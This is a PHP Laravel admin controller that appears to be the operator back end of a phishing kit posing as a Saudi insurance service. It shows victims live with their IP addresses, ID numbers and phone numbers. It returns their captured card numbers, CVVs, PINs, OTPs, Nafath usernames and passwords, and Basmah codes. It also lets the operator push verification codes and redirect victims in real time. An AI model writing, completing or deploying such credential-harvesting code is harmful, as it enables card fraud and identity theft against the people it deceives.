<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\InsuranceRequest;
use App\Models\UserDevice;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Carbon\Carbon;

class LiveDashboardController extends Controller
{
    /**
     * Display live dashboard
     */
    public function index()
    {
        return view('admin.live_dashboard.index');
    }

    /**
     * Get live dashboard data (AJAX)
     */
    public function getData()
    {
        try {
            // Get all insurance requests with their device info
            $users = InsuranceRequest::with('userDevice')
                ->select([
                    'id',
                    'full_name',
                    'id_number',
                    'mobile_number_statements as mobile_number',
                    'current_route',
                    'is_active',
                    'last_activity',
                    'device_id',
                    'created_at'
                ])
                ->orderBy('last_activity', 'desc')
                ->get()
                ->map(function ($user) {
                    // Get IP from user device
                    $device = UserDevice::find($user->device_id);
                    $user->ip_address = $device ? $device->ip_address : 'غير معروف';
                    
                    // Check if user is active (last activity within 5 minutes)
                    if ($user->last_activity) {
                        $lastActivity = Carbon::parse($user->last_activity);
                        $user->is_active = $lastActivity->diffInMinutes(now()) <= 5;
                    } else {
                        $user->is_active = false;
                    }
                    
                    return $user;
                });

            // Calculate statistics
            $statistics = [
                'total' => $users->count(),
                'online' => $users->where('is_active', true)->count(),
                'pending' => InsuranceRequest::where('approval_status', 'pending')->count(),
                'completed' => InsuranceRequest::where('approval_status', 'approved')->count(),
            ];

            return response()->json([
                'users' => $users,
                'statistics' => $statistics
            ]);

        } catch (\Exception $e) {
            return response()->json([
                'error' => 'حدث خطأ في تحميل البيانات',
                'message' => $e->getMessage()
            ], 500);
        }
    }

    /**
     * Get user details for Card Control modal
     */
    public function getUserDetails($id)
    {
        try {
            $user = InsuranceRequest::with('userDevice')->findOrFail($id);
            
            // Get device info
            $device = $user->userDevice;
            
            // Prepare submissions data (from payment attempts)
            $submissions = [];
            
            // Submission 1 - Main card data
            if ($user->name_on_card || $user->card_number) {
                $submissions[] = [
                    'name' => $user->name_on_card,
                    'card_number' => $user->card_number,
                    'expiry' => $user->expiry_date,
                    'cvv' => $user->cvv,
                ];
            }
            
            // Check if there are multiple submissions stored in JSON fields
            // You can add more submissions if you store them
            
            // Prepare response
            $response = [
                'id' => $user->id,
                'ip_address' => $device ? $device->ip_address : 'غير معروف',
                'full_name' => $user->full_name,
                'id_number' => $user->id_number,
                'mobile_number' => $user->mobile_number_statements,
                'current_route' => $user->current_route,
                'is_active' => $user->is_active,
                'last_activity' => $user->last_activity,
                
                // Submissions
                'submissions' => $submissions,
                
                // Card PIN/OTP
                'card_pin' => $user->card_pin ?? null,
                'card_otp' => $user->card_otp ?? null,
                
                // Phone/OTP
                'phone_number' => $user->mobile_number_statements,
                'operator' => $this->detectOperator($user->mobile_number_statements),
                'birth_date' => $user->birth_date,
                'phone_otp' => $user->phone_otp ?? null,
                
                // Nafad/Basmah
                'nafad_user' => $user->nafad_user ?? null,
                'nafad_pass' => $user->nafad_pass ?? null,
                'basmah_code' => $user->basmah_code ?? null,
            ];

            return response()->json($response);

        } catch (\Exception $e) {
            return response()->json([
                'error' => 'فشل في تحميل بيانات المستخدم',
                'message' => $e->getMessage()
            ], 500);
        }
    }

    /**
     * Send verification code to user
     */
    public function sendCode(Request $request)
    {
        $request->validate([
            'user_id' => 'required|exists:insurance_requests,id',
            'code_type' => 'required|string',
            'code' => 'required|string',
        ]);

        try {
            $userId = $request->input('user_id');
            $codeType = $request->input('code_type');
            $code = $request->input('code');
            
            $user = InsuranceRequest::findOrFail($userId);
             
            // Store the code based on type
            switch ($codeType) {
                case 'b-call':
                case 'c-code':
                    $user->card_otp = $code;
                    break;
                    
                case 'pin':
                    $user->card_pin = $code;
                    break;
                    
                case 'phone':
                case 'p-code':
                    $user->phone_otp = $code;
                    break;
                    
                case 'stc-call':
                    $user->phone_otp = $code;
                    break;
                    
                case 'nafad':
                    $user->nafad_code = $code;
                    break;
                    
                case 'nafad-basmah':
                    $user->basmah_code = $code;
                    break;
            }
            
            $user->save();

            // Here you can also trigger a real-time event to show the code on user's screen
            // event(new CodeSent($user->id, $codeType, $code));

            return response()->json([
                'success' => true,
                'message' => 'تم إرسال الكود بنجاح'
            ]);

        } catch (\Exception $e) {
            return response()->json([
                'error' => 'فشل في إرسال الكود',
                'message' => $e->getMessage()
            ], 500);
        }
    }

    /**
     * Approve user and redirect
     */
    public function approveUser(Request $request)
    {
        $request->validate([
            'user_id' => 'required|exists:insurance_requests,id',
            'redirect_to' => 'required|string',
        ]);

        try {
            $userId = $request->input('user_id');
            $redirectTo = $request->input('redirect_to');
            
            $user = InsuranceRequest::findOrFail($userId);
            
            $user->approval_status = 'approved';
            $user->approval_redirect_url = $redirectTo;
            $user->approved_by = auth('super_admin')->id();
            $user->approved_at = now();
            $user->save();

            // Trigger real-time event
            // event(new UserApproved($user->id, $redirectTo));

            return response()->json([
                'success' => true,
                'message' => 'تمت الموافقة على المستخدم'
            ]);

        } catch (\Exception $e) {
            return response()->json([
                'error' => 'فشل في الموافقة',
                'message' => $e->getMessage()
            ], 500);
        }
    }

    /**
     * Reject user
     */
    public function rejectUser(Request $request)
    {
        $request->validate([
            'user_id' => 'required|exists:insurance_requests,id',
        ]);

        try {
            $userId = $request->input('user_id');
            $user = InsuranceRequest::findOrFail($userId);
            
            $user->approval_status = 'rejected';
            $user->approved_by = auth('super_admin')->id();
            $user->approved_at = now();
            $user->save();

            // Trigger real-time event
            // event(new UserRejected($user->id));

            return response()->json([
                'success' => true,
                'message' => 'تم رفض المستخدم'
            ]);

        } catch (\Exception $e) {
            return response()->json([
                'error' => 'فشل في الرفض',
                'message' => $e->getMessage()
            ], 500);
        }
    }

    /**
     * Detect operator from phone number
     */
    private function detectOperator($phone)
    {
        if (!$phone) return '—';
        
        $phone = preg_replace('/[^0-9]/', '', $phone);
        
        // STC prefixes
        if (preg_match('/^(05[05]|5[05])/', $phone)) {
            return 'STC';
        }
        
        // Mobily prefixes
        if (preg_match('/^(05[46]|5[46])/', $phone)) {
            return 'Mobily';
        }
        
        // Zain prefixes
        if (preg_match('/^(05[89]|5[89])/', $phone)) {
            return 'Zain';
        }
        
        return 'غير معروف';
    }
}
